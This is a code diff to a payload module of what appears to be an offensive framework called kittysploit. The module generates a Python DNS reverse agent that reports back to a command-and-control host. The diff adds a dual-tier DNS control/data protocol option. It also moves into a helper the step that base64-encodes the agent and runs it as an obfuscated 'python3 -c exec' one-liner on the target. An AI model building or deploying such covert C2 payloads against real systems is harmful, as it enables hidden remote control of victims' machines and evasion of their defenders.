@@ -1,5 +1,4 @@
 from kittysploit import *
-import base64
 
 from lib.c2.dns_reverse_agent import build_python_dns_agent_script
 
@@ -29,6 +28,7 @@ class Module(Payload):
 	lhost = OptString("127.0.0.1", "DNS server address (C2 host)", True)
 	lport = OptPort(53, "DNS server port (53 or listener lport)", True)
 	poll_interval = OptInteger(5, "Poll interval seconds", False)
+	dual_tier = OptBool(True, "Use ks.v1 control/data dual-tier DNS protocol", False)
 	python_binary = OptString("python3", "Python on target", True)
 
 	def generate(self):
@@ -50,7 +50,6 @@ class Module(Payload):
 			str(self.lhost),
 			int(self.lport),
 			float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 5),
+			dual_tier=bool(getattr(getattr(self, "dual_tier", None), "value", getattr(self, "dual_tier", True))),
 		)
-		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-		py = str(self.python_binary)
-		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+		return self._encode_python_one_liner(script, self.python_binary)
